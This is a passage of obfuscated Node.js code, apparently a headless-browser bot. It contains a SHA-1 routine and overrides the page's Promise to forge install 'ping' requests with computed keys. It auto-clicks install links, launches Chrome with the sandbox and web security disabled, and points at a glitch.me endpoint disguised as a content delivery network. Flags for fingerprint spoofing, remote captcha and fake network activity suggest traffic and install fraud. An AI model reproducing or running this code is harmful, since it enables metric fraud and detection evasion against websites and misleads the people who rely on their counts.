                return this['bytes'] > 0x9c4d47d8 + -0x17f * -0x144d169 + -0x1824293f0 && (this['hBytes'] += this['bytes'] / (-0x1522d4bb4 + 0xf221fee4 + -0x5802d334 * -0x4) << 0x94 * -0x11 + 0x1985 + -0xfb1, this['bytes'] = this['bytes'] % (-0xa7a6ecdc + -0x12e9e3d10 + 0x2d64529ec)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xd8c + -0xfe3 + 0x5 * 0x78;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x164 + -0x2 * -0x638 + 0x4 * -0x371] = this['block'], J[K >> 0x1121 + -0x1a33 + 0x2 * 0x48a] |= x[0x1 * -0x2c9 + 0x1 * -0x10d + 0xc5 * 0x5 & K], this['block'] = J[0x1abd + 0x1 * 0x788 + -0x1a1 * 0x15], K >= 0x11dc + -0x17 * -0x47 + -0x1805 && (this['hashed'] || this['hash'](), J[-0x165 * 0x13 + -0x5ec * -0x2 + 0xea7] = this['block'], J[-0x6 * -0x4 + 0x1141 + -0x3b * 0x4b] = J[-0xa02 + 0xc74 * 0x2 + -0xee5] = J[-0x1c19 * 0x1 + -0x174e + 0x3369] = J[0x3 * 0x13d + 0xfc7 + -0x137b] = J[0x79b * 0x3 + 0x5 * -0x199 + 0x278 * -0x6] = J[0x3 * 0x2a5 + 0x7b * 0x48 + -0x2 * 0x1541] = J[0x13d + -0x1194 + 0x1 * 0x105d] = J[-0x4 * 0x6c7 + 0x24b4 + -0x991] = J[0x1cb3 + 0x93c + 0x1f * -0x139] = J[-0x8b5 * 0x3 + -0x1 * -0x1d6f + -0x347] = J[-0x1bef + -0x38 + -0x407 * -0x7] = J[0x220f * -0x1 + 0xd13 + 0x1507] = J[-0x298 + 0x1 * -0xdd5 + 0x1079] = J[0x3 * 0x73b + -0xc40 + -0x964] = J[-0xd94 + -0x2a1 * -0x6 + 0x2 * -0x112] = J[0x2287 + -0x3f5 + -0x1e83] = 0xa0f + -0x1e9c + 0x1 * 0x148d), J[0x7 * -0x24a + -0x7 * 0x356 + 0x276e] = this['hBytes'] << -0x89 * -0x17 + -0x543 * 0x7 + 0x23b * 0xb | this['bytes'] >>> 0x1 * -0x222a + 0x6e * -0x34 + -0xd * -0x45b, J[0x4b * 0x39 + 0x2047 + 0x7 * -0x6fd] = this['bytes'] << 0xd * 0x16a + -0x1e * -0xe4 + 0x11 * -0x2a7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x9a2 + 0x4c4 * -0x5 + -0x2186 * -0x1; J < 0x19d4 + -0x10ee + 0x7 * -0x13a; ++J)
                K = Q[J - (-0x237d + -0xe25 + -0x47 * -0xb3)] ^ Q[J - (0xc3 * -0x17 + 0x274 + -0x305 * -0x5)] ^ Q[J - (0x2ab * -0x3 + -0x6ca * 0x1 + 0x7 * 0x21f)] ^ Q[J - (-0x4db * -0x2 + 0xb89 + 0xbb * -0x1d)], Q[J] = K << -0xd75 * 0x2 + -0x3 * 0xba6 + -0x149f * -0x3 | K >>> -0x23d * 0xf + -0xb33 + -0x1 * -0x2ce5;
              for (J = 0x215f + 0x2e * 0xb3 + -0x373 * 0x13; J < 0x1 * -0x83 + -0x2127 + 0x21be; J += -0x1706 + -0x1137 + 0x2842 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xae0 + 0x114e + -0x669 | L >>> 0x944 + 0x20db * 0x1 + -0x2a04) + (M & N | ~M & O) + P + (0x767caeb4 + 0x7a8007ba + -0x13 * 0x7eb7c77) + Q[J] << 0x1 * -0x1b0a + 0x517 * -0x1 + 0x19 * 0x149) << -0x17 * 0x115 + -0x16d * 0x5 + 0x2009 | P >>> -0x1 * 0x1b76 + 0x343 + -0x3 * -0x81a) + (L & (M = M << 0x15af + 0xd62 * -0x2 + -0xb * -0x79 | M >>> 0x2ce * -0x2 + 0x117b + -0xbdd) | ~L & N) + O + (-0x3fa725d + -0x1 * -0x295c1d9b + 0x3520ce5b) + Q[J + (0x17f7 + 0x2f * 0xb7 + 0x5 * -0xb83)] << 0x1689 + 0x275 + 0x18fe * -0x1) << 0x1 * -0xbce + -0x97a + 0x154d | O >>> 0x14ce + 0x1 * 0x815 + 0x6 * -0x4cc) + (P & (L = L << -0x1 * 0x1f05 + -0x137 * -0x1b + -0x1aa | L >>> 0x1 * 0x181d + 0x2 * 0xc2a + 0x306f * -0x1) | ~P & M) + N + (0xcfb * -0xce51f + 0xb31a492a + 0x2 * 0x276524ea) + Q[J + (-0x17c * -0x17 + -0x11ab + 0x34b * -0x5)] << -0x1426 + 0xd * 0x2a5 + -0xe3b) << -0x9de + 0x2 * -0x9d5 + -0x1d8d * -0x1 | N >>> -0x2 * 0x112a + -0x23e2 + 0x1 * 0x4651) + (O & (P = P << 0x1 * -0x1204 + 0x3b * 0x2f + 0x74d | P >>> -0x7 * -0xf7 + 0x32 * -0x7d + -0x1 * -0x11ab) | ~O & L) + M + (-0xd61800b + 0x4127997 + -0x1 * -0x63d1800d) + Q[J + (-0x1cf8 + -0x24bf * -0x1 + -0x7c4)] << 0x56 * 0x47 + -0x1a5c + 0x282) << -0xfd1 + -0x1950 + 0x2926 | M >>> -0x2173 + 0xd3 * 0x3 + -0x1f15 * -0x1) + (N & (O = O << -0x9b8 + -0x269d * 0x1 + 0x3073 | O >>> -0x23a9 * 0x1 + 0xfc7 * 0x2 + 0x41d) | ~N & P) + L + (-0x2eb26c2c + -0x5ee2 * -0x885c + 0x56aabc8d) + Q[J + (-0xa4c * -0x2 + -0x215 + -0x3b3 * 0x5)] << 0x117d + -0x1 * 0xf43 + 0x3 * -0xbe, N = N << -0x1 * -0x207e + -0x7b + 0x1 * -0x1fe5 | N >>> 0x2479 + -0x11e6 + -0x1291;
              for (; J < 0x1 * 0x8a2 + -0x61 * -0x45 + 0x229f * -0x1; J += 0x150 + -0x1791 + 0x2 * 0xb23)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1847 + 0x22f0 + -0x1c6 * 0x6 | L >>> -0x14bf + -0x92 * -0x2 + 0x13b6) + (M ^ N ^ O) + P + (0xca0ef893 + -0xb7b7e3 * -0xb7 + -0xde898037) + Q[J] << 0x1 * -0x220a + -0x105a + 0x3264) << -0xb85 + -0xd82 + 0x190c | P >>> 0x1014 + -0x15d + 0x2ec * -0x5) + (L ^ (M = M << -0x5 * -0x151 + -0x5 * 0x5b9 + 0x1626 | M >>> -0x6b9 + -0x19e5 + 0x20a0) ^ N) + O + (0x2dc517d8 + 0x1 * 0x5531d6fe + -0x153 * 0xf3057) + Q[J + (-0x65d + -0x1ce6 + 0x2344)] << 0x18cf + -0x1376 * 0x1 + -0x559) << 0xb71 + 0x7c1 + -0x1 * 0x132d | O >>> -0x1a3d + 0x1 * 0x72a + -0xa * -0x1eb) + (P ^ (L = L << -0x1732 + 0x21 * -0x82 + 0x2812 | L >>> -0x1 * 0x6c4 + 0xb6 * 0x16 + -0x1c6 * 0x5) ^ M) + N + (-0x34d9ca39 + 0x87953068 + -0x45a * -0x6763d) + Q[J + (-0x2d * 0x10 + 0x11 * 0x11 + 0x1b1)] << -0x240a + 0x142 * 0x1b + 0x214) << 0xbd3 + 0x202 * 0x8 + -0x1bde | N >>> -0x79 * -0x2f + 0xcf1 * 0x3 + -0x3cef) + (O ^ (P = P << -0x1236 + 0x1c46 + -0x9f2 | P >>> 0x1c7a + 0x4d * -0x39 + -0xb53) ^ L) + M + (-0x88a0f845 + 0xa45eeb3a + 0x531bf8ac) + Q[J + (-0x20a0 + 0x2560 + -0x4bd)] << 0x12f * -0x21 + -0xb5e + -0x3e1 * -0xd) << -0x7f0 + -0x37 * 0x83 + 0x241a | M >>> 0x25fe + 0xbe4 + -0x31c7) + (N ^ (O = O << -0x168f + -0x2 * 0xfcd + 0x3647 | O >>> 0x10ed + -0x138d + 0x2 * 0x151) ^ P) + L + (-0x58481815 + -0x2cf1b8f8 + -0x18b7779 * -0x9e) + Q[J + (-0x64 * 0x1 + 0xc9f + -0xc37)] << -0x20b5 + 0x22b8 + -0x67 * 0x5, N = N << -0x36 * -0xab + -0xe5 * 0x1d + -0xb * 0xe9 | N >>> -0xa6 + -0x262 + 0x30a;
              for (; J < -0x7f + -0x6 * -0x236 + -0xc89 * 0x1; J += -0x1 * 0x12b + -0x462 + 0x2c9 * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x12e9 + -0x183b + 0x2b29 | L >>> 0x1f3 * -0xc + 0x9f1 + 0x2 * 0x6c7) + (M & N | M & O | N & O) + P - (0x5d2b986b + 0x1 * -0x871407bc + 0x9accb275) + Q[J] << -0x7 * 0xe9 + -0x1533 + 0x2 * 0xdc9) << 0x1d75 + 0x1b + -0x9d9 * 0x3 | P >>> 0x2181 + -0xd * 0x171 + -0xea9) + (L & (M = M << -0x1f56 + -0x90b + 0x287f | M >>> -0xeb + 0x4 * 0x4d9 + -0x1277) | L & N | M & N) + O - (-0x26830 * 0x45df + 0x27 * -0x55d9ac3 + 0x25ef2d * 0xced) + Q[J + (-0x355 * -0xb + 0x1 * -0x201d + -0x489 * 0x1)] << 0x1 * 0x9c9 + -0xb1a + 0x151) << 0x3a * 0x1f + -0x1 * -0x2395 + -0x2a96 | O >>> -0xa * -0x397 + 0x25c + -0x2627) + (P & (L = L << 0x1883 + 0x5d2 * -0x6 + 0x4d * 0x23 | L >>> -0x1de5 + 0x12e8 + 0xaff) | P & M | L & M) + N - (-0x3cf58169 + 0xc3e41c1e * 0x1 + 0x272ed49 * -0x9) + Q[J + (-0x1c81 * 0x1 + 0x769 + 0x4a * 0x49)] << -0x149f * 0x1 + -0x40 * 0x1b + 0x1b5f) << -0x178c + -0x3 * 0xc2c + 0x3c15 | N >>> 0x1 * -0x2563 + 0x756 + 0x2 * 0xf14) + (O & (P = P << -0x4 * 0x8a5 + -0x1 * -0x1cfb + 0x7 * 0xd1 | P >>> -0x1f90 + 0x3f6 + 0x13 * 0x174) | O & L | P & L) + M - (0x45fdc * -0x1a35 + -0x4c4a50c2 + 0x12fd2c472) + Q[J + (-0x2424 + 0x303 + 0x2124)] << -0x17 * -0xe5 + -0x1 * 0x25fc + -0x1169 * -0x1) << -0x9d * 0xb + 0xd0 + 0x5f4 | M >>> -0x9cb + 0xd01 + -0x31b) + (N & (O = O << 0x130b + 0x37d * 0x1 + 0x166a * -0x1 | O >>> -0x228 * 0x6 + -0x2 * -0x107 + 0xae4) | N & P | O & P) + L - (-0x8fa5fdd7 + 0x99e09a76 * 0x1 + 0x66a9a685) + Q[J + (-0x1e41 + -0x1fef + 0x4 * 0xf8d)] << -0x21f5 + -0x1cba + -0x1 * -0x3eaf, N = N << -0x1ca * -0x9 + 0x2 * -0x1b5 + 0x1 * -0xc92 | N >>> 0x8dd + 0x1689 + 0x7d9 * -0x4;
              for (; J < -0x6 * -0x2b7 + -0x9ac * 0x4 + 0x16b6; J += -0x1 * -0x1bda + -0x966 * -0x2 + 0x17 * -0x207)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x181b + 0x202d + -0x3 * 0x2af | L >>> 0x1c75 + -0x1c * 0xc8 + -0x67a) + (M ^ N ^ O) + P - (0x3c4a28d0 + -0x5 * 0x99b53a + -0x3ac6084) + Q[J] << 0x767 + 0x32 + 0x1 * -0x799) << -0x1b3f + -0x196e + 0x34b2 | P >>> 0x7a3 + -0x1 * -0x8a5 + -0x65 * 0x29) + (L ^ (M = M << 0x3 * 0x5d5 + 0xff7 + -0x2 * 0x10ac | M >>> 0xfb5 * -0x1 + -0xf08 + -0x1 * -0x1ebf) ^ N) + O - (-0x1 * 0x4e2d606b + -0x3 * 0x1a992b95 + 0xd3962154 * 0x1) + Q[J + (0x6f0 * 0x1 + -0x4c3 + 0x8b * -0x4)] << -0xeaa + 0x7 * 0x215 + 0x17) << 0x27 * 0x4e + 0x9be * 0x2 + -0x1f59 | O >>> 0x1c99 * 0x1 + 0x17 * -0x5 + 0x959 * -0x3) + (P ^ (L = L << 0x13fd + -0x19ca + -0x12f * -0x5 | L >>> -0x3 * 0x393 + -0x1c4d + 0x2708) ^ M) + N - (0x13 * -0x4b1d4d6 + -0xfa42 * -0x373 + 0x68aece * 0x155) + Q[J + (-0x21c3 + 0x5e7 * -0x4 + -0x25 * -0x18d)] << 0x163 * 0xb + 0x18dd + -0x281e) << 0x3 * 0x80b + -0x19f + -0x39 * 0x65 | N >>> 0x3 * 0x8ba + 0x1174 + -0x2b87) + (O ^ (P = P << -0xd2d * -0x2 + -0x2f * -0xa4 + -0xe16 * 0x4 | P >>> -0x3 * 0xa7 + -0x1 * 0x1b0e + 0x1d05) ^ L) + M - (-0x925da42 + 0x1 * 0x107d97ca + 0x2e4580a2) + Q[J + (-0x17a3 + -0xb3a * 0x1 + 0x22e0)] << 0x8b * -0x1 + -0x1a2d * -0x1 + -0x19a2) << 0x1653 + 0x2 * 0x9d3 + -0xdfc * 0x3 | M >>> -0x168b + 0x1837 + -0x191) + (N ^ (O = O << 0x1d19 * 0x1 + 0xffe * 0x2 + -0x3cf7 | O >>> -0x1c60 + 0x2d * -0x8b + -0x119b * -0x3) ^ P) + L - (0x3850eaa + -0x2a4ee * -0x2080 + -0x11ec03c0 * 0x2) + Q[J + (0x13cd + -0x1 * -0xe3b + -0x1 * 0x2204)] << -0x1 * -0x7a7 + -0x5ed + -0x1ba, N = N << 0x73 * 0x17 + 0x154b + -0xda * 0x25 | N >>> -0xbf * 0x1f + -0x166 * -0x8 + 0xbf3;
              this['h0'] = this['h0'] + L << -0x1 * 0x17e9 + -0x238c + 0x1 * 0x3b75, this['h1'] = this['h1'] + M << 0x3e0 + 0xcf5 + -0x10d5, this['h2'] = this['h2'] + N << 0x143 * 0x1b + 0xa34 + -0x2c45, this['h3'] = this['h3'] + O << 0x1700 + -0x1941 + 0x241, this['h4'] = this['h4'] + P << -0xe * 0x9c + 0x2f * 0x65 + -0xb * 0xe9;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2650 + -0x892 + -0x1 * 0x1da2 & -0x3b9 * -0x4 + 0x40 * -0x57 + 0x6eb] + w[J >> -0x8 * 0xe9 + 0x207d * -0x1 + 0x27dd & -0x9eb + 0x232 * -0x11 + 0x2f4c] + w[J >> 0x3ad * -0x6 + -0x7 * -0x55b + -0xf5b & -0xd23 + -0x1c17 + -0x2949 * -0x1] + w[J >> 0xc * -0x191 + -0x335 + -0x15 * -0x10d & 0x3a6 + 0xb3 * 0x1 + -0x6 * 0xb7] + w[J >> 0x23 * 0x28 + 0x152a + 0x53 * -0x52 & -0x26a * -0xa + 0x2041 + -0x2 * 0x1c2b] + w[J >> 0x3 * -0x18f + 0x15e9 + -0x1134 & -0x2c2 * -0x3 + -0x2264 + -0x1a2d * -0x1] + w[J >> 0x2 * -0xb96 + 0x259d + 0x4cf * -0x3 & 0x2237 + 0x1 * -0xc05 + 0x3 * -0x761] + w[-0x20e3 * -0x1 + 0x6 * 0x27 + -0x21be & J] + w[K >> 0x1c41 + 0x1 * -0x13f7 + -0x82e & -0x1 * -0x1d97 + -0x3 * -0xbd5 + -0x1f * 0x219] + w[K >> 0x2593 + -0xce9 * -0x1 + -0x2b * 0x12c & 0x171 * 0x11 + 0x72 * -0x57 + 0xe4c] + w[K >> -0x27 * -0x5d + 0x12 * 0x158 + -0x1 * 0x2647 & -0x1 * -0x1a93 + 0x2 * -0x5d3 + -0xede] + w[K >> 0x73 * -0x1d + -0x1 * 0x22db + 0x11 * 0x2d2 & -0x1132 + 0x23cc + -0x128b * 0x1] + w[K >> -0x19a3 + 0x18c2 + 0xed & -0x24e * 0x9 + -0x1f * 0x57 + 0x1f56] + w[K >> -0x10b3 + 0x260b + 0x155 * -0x10 & 0x204 * -0x1 + 0x569 * -0x7 + 0x1 * 0x27f2] + w[K >> 0x1 * 0x14bc + -0x16b8 + -0x1 * -0x200 & -0x24e7 + -0x1057 * -0x2 + 0x2 * 0x224] + w[-0x219f * -0x1 + 0x210 + 0x5f * -0x60 & K] + w[L >> -0xe * -0x123 + 0x5a4 + -0x1572 & -0x250 * 0x10 + -0xbf0 + -0x3 * -0x1055] + w[L >> -0x57 * -0x43 + 0x1 * -0x1dd1 + 0x724 & -0x1 * -0x1181 + 0x351 + -0x14c3] + w[L >> 0x12b4 + -0xef5 * -0x2 + 0x72 * -0x6d & 0x3 * -0x5a5 + 0x224 * 0xa + -0x46a] + w[L >> 0x2 * 0xbd4 + 0xcbb + -0x2453 & -0x123a + -0x5e0 + -0x4d5 * -0x5] + w[L >> -0x383 * 0x7 + 0x13de + 0x4c3 * 0x1 & 0x222b * 0x1 + -0x17c9 * -0x1 + 0x39e5 * -0x1] + w[L >> -0x101b + -0x78b * 0x1 + 0x17ae & 0x20bb + -0x1d3b + 0x371 * -0x1] + w[L >> 0x19d5 + 0x4da * 0x4 + -0x2d39 & 0xacb + 0x21a * -0x6 + -0xc * -0x28] + w[-0x1c77 + 0x6 * 0x584 + -0xf * 0x4e & L] + w[M >> 0x1caf + -0x9d9 + -0x31f * 0x6 & -0x2120 + 0x1a09 + 0x726] + w[M >> -0x14c9 + -0xf6 * -0x5 + 0x1013 & -0x103d * 0x2 + -0x1484 + 0x350d] + w[M >> 0x3 * 0x347 + 0x7d + -0xa3e & 0x1a3f + -0xeb6 + -0xb7a * 0x1] + w[M >> -0x67 * 0x12 + 0x1654 + 0x1 * -0xf06 & -0x1 * 0x964 + 0x59 * -0x3a + 0x1d9d * 0x1] + w[M >> -0x269 * 0x1 + -0x7a * -0x30 + -0x146b * 0x1 & -0x9 * 0xd3 + 0x142b + -0x3 * 0x43b] + w[M >> -0x14e1 + 0x8dc + -0x269 * -0x5 & -0x2 * 0x67a + 0x24f + -0x14 * -0x89] + w[M >> -0xfdf + -0x14d8 * -0x1 + 0x1a7 * -0x3 & -0x216 + 0x20e5 + -0x1ec0] + w[-0x10f * -0x6 + -0x20d2 + 0x1a87 & M] + w[N >> 0x1a7e + 0x1cdd + -0x373f & -0xa25 + -0x7d0 + 0x1204] + w[N >> -0x1268 + 0x86a + 0xa16 & 0x161 * 0x12 + 0x5 * 0x113 + -0x44e * 0x7] + w[N >> 0x2a * 0x52 + 0x4e6 * -0x4 + 0xc7 * 0x8 & 0x5 * 0x2fb + 0xdb * -0x5 + -0xa91] + w[N >> 0xaca + -0xda9 + 0x2ef & 0x1b45 + -0x214c + -0x1 * -0x616] + w[N >> -0x5c * 0xb + -0x248d + 0x288d & -0x1569 + 0xd * -0x1fb + 0x2f37] + w[N >> 0x1d1b * -0x1 + 0x7 * 0x209 + 0xee4 & 0x6 * -0x36f + -0xacf * -0x3 + -0xc * 0xfb] + w[N >> 0x1125 + 0x19e7 + -0x51 * 0x88 & -0x5d * 0x27 + -0x21b6 + -0x3b0 * -0xd] + w[-0x1ad0 + 0x5 * 0x33e + 0xaa9 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xbe6 + -0x161a + 0xa4c * 0x1 & -0x1 * 0x1d43 + 0x23a + -0x45 * -0x68,
                J >> -0xeef * 0x1 + 0x352 + 0xbad & 0x1d63 + 0x19 * -0x29 + -0x1863,
                J >> 0x102d + -0x1257 + -0x119 * -0x2 & -0x12df + 0x2039 + -0xc5b,
                0x628 * 0x3 + -0x21c * -0x3 + -0x17cd & J,
                K >> -0x1c65 + -0x198f + 0x360c & 0x1 * 0xb + -0x3f * 0x1 + 0x133,
                K >> -0x2523 + -0x20b0 + 0x45e3 & -0x1 * 0x157 + -0xe11 + 0x1067,
                K >> -0x611 * -0x5 + -0x91 * -0x1b + -0x1 * 0x2d98 & 0x1cb * -0x1 + -0xac * 0x13 + 0xf8e,
                -0x2135 + -0x7ae * 0x2 + 0x68 * 0x7a & K,
                L >> 0x15c6 + -0x29 * -0x6 + -0x2 * 0xb52 & -0x17b1 + -0x5f * 0x27 + 0x2729,
                L >> -0x1f6 * -0x6 + -0xf29 + 0x375 & 0x1191 + 0x1 * -0x23b3 + -0x3b * -0x53,
                L >> 0x1 * -0x201b + -0x1bbe * 0x1 + 0x3be1 & 0x1 * 0x286 + 0x11c6 + -0x134d,
                -0x12e2 * 0x1 + -0x1 * -0xecf + 0x76 * 0xb & L,
                M >> 0x18fc + 0x177f + -0x3063 * 0x1 & -0xd41 + 0x2 * -0x687 + 0x1b4e,
                M >> 0x1 * -0x1d23 + -0xa51 + 0x2784 & 0x1582 + -0x19 * -0x12f + -0x16 * 0x247,
                M >> 0x3d + -0x5ef * -0x1 + -0x624 & 0x1 * 0x558 + 0x1b * -0x16a + 0x21d5,
                0x1bd5 + 0x178 + -0x1c4e & M,
                N >> -0x855 * 0x1 + -0x21d9 + -0x305 * -0xe & -0xef * -0x16 + 0xf29 + -0x8ad * 0x4,
                N >> -0x289 + 0x2 * 0x45 + -0x1f * -0x11 & -0x1522 + 0x31e * -0xb + 0x386b,
                N >> -0x19af + 0x1 * -0x235d + 0x3d14 & -0x1e3f * 0x1 + 0x192d * 0x1 + 0x611,
                -0x916 * -0x1 + 0x1 * -0x1d7b + 0x1564 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xc * -0x4 + 0x675 + -0x631), (K = new DataView(J))['setUint32'](0x18dd + -0x103d + 0xb8 * -0xc, this['h0']), K['setUint32'](0x249b + 0x36c + -0x2803, this['h1']), K['setUint32'](-0x4 * 0x632 + 0x2323 + -0x371 * 0x3, this['h2']), K['setUint32'](0xded + 0x892 * 0x2 + -0x1f05, this['h3']), K['setUint32'](-0x1a * 0x53 + -0x14ca * -0x1 + 0x1 * -0xc4c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1f8f + -0x1aa5 + -0x3a34 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1200 + 0x26fb + -0x14fb;
            J[0x1b + 0x133 * 0x7 + -0x880]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xa21 * -0x2 + 0x83 * -0x46 + 0xf90] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xdae + 0x693 * 0x4 + 0x1 * -0xc9d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x142c + -0xe8b + -0x24 * 0x28;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2309 * 0x1 + 0x1b38 + 0x48f * 0x3), Promise['resolve'](0x8a0 + 0x1bb + -0xa5a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x5ef * -0x3 + 0x26ff + -0x1532; j < -0x3b7 + 0x268a + 0x1 * -0x22d2; j++)
    i();
}
const NETWORK_PATIENCE = -0x2 * -0x6a3 + 0x3626 + -0x242c + (-0x1c30 + -0x3a * 0x9 + 0x7 * 0x5fe) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * -0x1919 + -0x21b4 + 0x2 * 0x44f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x28b + -0x1a85 + 0x17fa);
    let h = e[f];
    if (c['bDEyyZ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x845 * -0x2 + -0x4e4 * -0x7 + -0x32c6, r, s, t = 0x1dd9 + 0x4e * -0x9 + -0x1b * 0x101; s = m['charAt'](t++); ~s && (r = q % (0x8 * 0x3dd + -0x1bc3 + -0x321) ? r * (-0x7 * 0x24f + 0x1fb5 * -0x1 + 0x301e) + s : s, q++ % (0x10 * -0x17f + 0xd00 + 0x2 * 0x57a)) ? o += String['fromCharCode'](-0x115e + -0x798 * 0x2 + 0x4cb * 0x7 & r >> (-(-0xa * -0xf1 + -0x67 * 0x61 + -0x1 * -0x1d9f) * q & -0xc7 * -0x16 + -0x1cb5 + 0xba1)) : -0x35 * 0x7a + 0x107 * 0xa + -0x112 * -0xe) {
          s = n['indexOf'](s);
        }
        for (let u = 0x233d + -0x1 * 0x25bf + 0x282, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x17dd + -0x1b2c + 0x3319))['slice'](-(-0x10f * -0x11 + 0x64a + -0x1847));
        }
        return decodeURIComponent(p);
      };
      c['QWLGIu'] = i, b = arguments, c['bDEyyZ'] = !![];
    }
    const j = e[0x26b2 + -0x22bd + -0x1 * 0x3f5],
      k = f + j,
      l = b[k];
    return !l ? (h = c['QWLGIu'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xa86 + -0x1496 + -0xe * -0xb8; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
